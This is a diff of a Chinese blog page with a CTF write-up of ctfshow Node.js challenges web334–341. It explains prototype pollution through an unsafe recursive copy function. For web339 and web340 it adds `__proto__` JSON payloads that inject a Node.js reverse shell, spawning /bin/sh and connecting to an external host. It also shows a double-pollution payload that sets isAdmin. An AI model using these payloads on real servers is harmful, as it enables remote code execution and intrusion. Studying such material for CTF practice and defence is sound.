@@ -72,7 +72,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web334"><span class="toc-text">web334</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web335-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">web335(命令执行	)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web336"><span class="toc-text">web336</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%951"><span class="toc-text">法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%952"><span class="toc-text">法2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%953"><span class="toc-text">法3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web337-nodejs%E7%89%B9%E6%80%A7"><span class="toc-text">web337(nodejs特性)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web338(原型链污染)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web339"><span class="toc-text">web339</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web334"><span class="toc-text">web334</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web335-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">web335(命令执行)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web336"><span class="toc-text">web336</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%951"><span class="toc-text">法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%952"><span class="toc-text">法2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%953"><span class="toc-text">法3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web337-nodejs%E7%89%B9%E6%80%A7"><span class="toc-text">web337(nodejs特性)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">web338(原型链污染)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web339-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8F%98%E9%87%8F"><span class="toc-text">web339(原型链污染变量)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web340-%E5%8F%8C%E5%B1%82%E6%B1%A1%E6%9F%93"><span class="toc-text">web340(双层污染)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web341-ejs-rce"><span class="toc-text">web341(ejs rce)</span></a></li></ol>
     </div>
   
         
@@ -244,12 +244,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Nodejs/" style="color: #03a9f4">Nodejs</a>
+                <a href="/blog/tags/Nodejs/" style="color: #ffa2c4">Nodejs</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/ctfshow/" style="color: #ff7d73">ctfshow</a>
+                <a href="/blog/tags/ctfshow/" style="color: #00bcd4">ctfshow</a>
             </span>
             
         </span>
@@ -263,7 +263,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.5k字</span>
+        <span class="post-count">2.2k字</span>
       </span>
     </span>
 
@@ -272,7 +272,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">7分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
     
@@ -349,7 +349,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
 <p>那做法就很明显了，利用大小写绕过即可，name传入<code>CTFshow</code>，passwd传入<code>123456</code></p>
 <p>然后登录就能回显flag</p>
 <hr>
-<h1 id="web335-命令执行"><a href="#web335-命令执行" class="headerlink" title="web335(命令执行	)"></a>web335(命令执行	)</h1><blockquote>
+<h1 id="web335-命令执行"><a href="#web335-命令执行" class="headerlink" title="web335(命令执行)"></a>web335(命令执行)</h1><blockquote>
 <p>命令执行</p>
 </blockquote>
 <p>f12发现hint：<code>&lt;!--/?eval=--&gt;</code></p>
@@ -534,18 +534,33 @@ router<span class="token punctuation">.</span><span class="token function">post<
 
 module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>common.js</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>审计代码，要想获得flag就需要让<code>secert.ctfshow===&#39;36dboy&#39;</code></p>
-<p>但是secert是一个空对象，同时我们注意到存在<code>  utils.copy(user,req.body);</code>，将 <code>user</code> 对象的属性复制到 <code>req.body</code> 对象中</p>
+<p>但是secert是一个空对象，同时我们注意到存在<code>  utils.copy(user,req.body);</code>，将 <code>user</code> 对象的属性copy到 <code>req.body</code> 对象中</p>
 <p>而user和secert属于同一个父类object，所以这里要使用原型链污染</p>
 <p>污染user让<code>secert.ctfshow</code>为<code>36dboy</code></p>
 <p>注：由于nodejs的post请求全在请求体中，需要抓包在burp发出才行</p>
 <p>payload</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"username"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string-property property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20230630125810185.png" alt="image-20230630125810185"></p>
 <hr>
-<h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><blockquote>
-<p>变量覆盖</p>
+<h1 id="web339-原型链污染变量"><a href="#web339-原型链污染变量" class="headerlink" title="web339(原型链污染变量)"></a>web339(原型链污染变量)</h1><blockquote>
+<p>原型链污染</p>
 </blockquote>
 <p>login.js变了</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -580,7 +595,8 @@ router<span class="token punctuation">.</span><span class="token function">post<
 
 module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>多了个api.js</p>
+<p>只有<code>secert.ctfshow</code>的值和flag相等才能得到flag，那这个判断基本上没有办法绕过</p>
+<p>还多了个api.js</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -594,10 +610,89 @@ router<span class="token punctuation">.</span><span class="token function">post<
    
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>出现了一个<code>render</code>函数，实际上是用来渲染api模板的，里面还传递了一个<code>Function(query)(query)</code>，可以知道这里会调用<a href="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#Function">匿名函数</a></p>
+<p>我们测试一下：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+
+<span class="token operator">></span>user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token operator">></span>body <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"query":"return 514"&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">></span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> body<span class="token punctuation">)</span>
+<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240112111341471.png" alt="image-20240112111341471"></p>
+<p>函数成功返回了514，可知这个匿名函数被原型链污染后可以执行任意代码</p>
+<p>所以我们可以通过污染<code>query</code>对象来执行命令</p>
+<p>直接考虑反弹shell，这里建议使用nodejs原生的socket来弹</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span> <span class="token string">"return (function()&#123;var net = global.process.mainModule.constructor._load('net'),cp = global.process.mainModule.constructor._load('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(57746, '76135132qk.imdo.co', function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么我们先抓包&#x2F;login接口，把payload传进去</p>
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240112113807298.png" alt="image-20240112113807298"></p>
+<p>此时query就被污染了</p>
+<p>接下来访问&#x2F;api接口触发命令执行，注意要以post请求访问</p>
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240112114215403.png" alt="image-20240112114215403"></p>
+<p>这样就弹shell了</p>
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240112114138957.png" alt="image-20240112114138957"></p>
+<p>flag在环境变量里面</p>
+<hr>
+<h1 id="web340-双层污染"><a href="#web340-双层污染" class="headerlink" title="web340(双层污染)"></a>web340(双层污染)</h1><p>看到一个很恰当的图就在这里贴一下</p>
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240113092752796.png" alt="image-20240113092752796"></p>
+<p>依旧是直接看login.js，api.js不变</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
+
+<span class="token comment">/* GET home page.  */</span>
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     
+    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  <span class="token punctuation">&#125;</span>
+  
+  
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这次条件变成了<code>user.userinfo.isAdmin</code>，copy里面的user对象后面也套了一个userinfo</p>
+<p>这里user.userinfo.isAdmin写在了函数里面，我们不能直接污染这个的值</p>
+<p>本地测看看：</p>
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240113092134941.png" alt="image-20240113092134941"></p>
+<p>可以发现第一层外面是一个对象，也就是构造函数，第二层才是我们要的object</p>
+<p>所以要进行两次<code>__proto__</code>实现双层污染</p>
+<p>测试一下：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"isAdmin"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/28/ctfshow-Nodejs%E4%B8%93%E9%A2%98/image-20240113095041350.png" alt="image-20240113095041350"></p>
+<p>污染成功，那我们同理可以利用api.js里面的<code>render</code>函数，污染<code>query</code>进行命令执行</p>
+<p>payload：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span> <span class="token string">"return (function()&#123;var net = global.process.mainModule.constructor._load('net'),cp = global.process.mainModule.constructor._load('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(57746, '76135132qk.imdo.co', function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>依旧是在&#x2F;login污染，在&#x2F;api触发反弹shell</p>
+<hr>
+<h1 id="web341-ejs-rce"><a href="#web341-ejs-rce" class="headerlink" title="web341(ejs rce)"></a>web341(ejs rce)</h1>
     </div>
     
     
